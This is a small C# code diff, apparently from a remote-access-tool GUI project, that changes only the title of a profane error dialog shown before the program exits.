@@ -19,7 +19,7 @@ namespace SSSRAT_GUI {
 			if (client == null) {
 				//hax
 				MessageBox.Show("try to cheat me again motherfucker",
-								_.PROGRAM_NAME + _.VERSION, //????????
+								_.PROGRAM_NAME, //????????
 				                MessageBoxButtons.OK,
 				                MessageBoxIcon.Error);
 				Environment.Exit(0);
